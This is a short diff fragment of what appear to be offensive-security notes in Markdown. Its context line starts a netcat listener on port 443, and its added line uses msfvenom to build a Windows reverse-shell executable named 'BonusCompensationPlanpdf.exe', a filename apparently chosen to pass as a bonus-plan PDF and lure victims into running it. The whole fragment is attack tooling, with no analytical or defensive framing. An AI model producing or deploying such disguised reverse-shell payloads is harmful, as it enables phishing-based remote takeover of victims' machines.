@@ -58,5 +58,8 @@ sudo nc -lnvp 443
 
 ### Create Payload on attacker box
 ```bash
-
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 ```
+
+---
+
